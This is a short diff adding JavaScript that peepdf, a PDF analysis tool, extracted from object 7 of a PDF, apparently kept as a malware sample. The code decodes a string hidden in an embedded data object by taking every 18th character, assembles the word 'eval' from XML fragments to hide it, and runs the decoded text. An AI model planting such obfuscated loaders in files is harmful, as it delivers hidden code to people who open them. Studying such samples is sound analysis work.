@@ -1,0 +1,13 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+    ra = this.getDataObjectContents("xampp");
+    rb = util.stringFromStream(ra, "utf-8");
+    rc = "";
+    for (i = 0; i < rb.length; i += 18) {
+        rc += rb.charAt(i);
+    }
+    rd = "<test><one>ev</one><two>al</two></test>";
+    re = XMLData.parse(rd);
+    rf = re.one.value + re.two.value;
+    this[rf](rc);
+
